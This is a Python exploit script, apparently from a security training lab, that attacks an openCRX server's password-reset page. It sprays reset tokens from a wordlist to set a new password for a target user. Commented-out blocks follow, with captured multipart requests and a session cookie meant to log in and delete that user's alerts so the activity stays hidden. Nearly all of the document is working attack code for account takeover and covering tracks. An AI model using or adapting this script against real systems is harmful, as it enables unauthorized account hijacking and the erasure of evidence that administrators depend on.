#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()
reset_status = False
target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text
        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            reset_status = True
            break







# logging in so we can delete alerts
if reset_status == True:
    pass
    '''
    session = requests.session()

    url = "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet"
    get_params = '?locale=en_US&timezone=Europe%2FZurich&initialScale=1&loginFailed=false'
    res = session.get(url+get_params)
    print(res.cookies)
    print(res.content)
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------132714394019586948594100185397", "Origin": "http://opencrx:8080", "Connection": "close", "Referer": "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet", "Upgrade-Insecure-Requests": "1"}
    data = "-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"requestId.submit\"\r\n\r\n3SDMQI82AX0BXSRFTCMECMGG8\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"reference\"\r\n\r\n0\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"pane\"\r\n\r\n0\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"size\"\r\n\r\n\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"event.submit\"\r\n\r\n28\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"parameter.list\"\r\n\r\nxri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert/3SDMO0A8L2YULSRFTCMECMGG8) \r\n-----------------------------132714394019586948594100185397--\r\n"
    session.post(url, headers=headers, data=data)
    '''


# delete alerts
# instead of the using burp we can use the api itself to delete alerts
'''
session = requests.session()

burp0_url = "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet"
burp0_cookies = {"JSESSIONID": "2A9833A5C735D33A43B16579ED6DA89C"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------132714394019586948594100185397", "Origin": "http://opencrx:8080", "Connection": "close", "Referer": "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet", "Upgrade-Insecure-Requests": "1"}
burp0_data = "-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"requestId.submit\"\r\n\r\n3SDMQI82AX0BXSRFTCMECMGG8\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"reference\"\r\n\r\n0\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"pane\"\r\n\r\n0\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"size\"\r\n\r\n\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"event.submit\"\r\n\r\n28\r\n-----------------------------132714394019586948594100185397\r\nContent-Disposition: form-data; name=\"parameter.list\"\r\n\r\nxri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert/3SDMO0A8L2YULSRFTCMECMGG8) \r\n-----------------------------132714394019586948594100185397--\r\n"
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
'''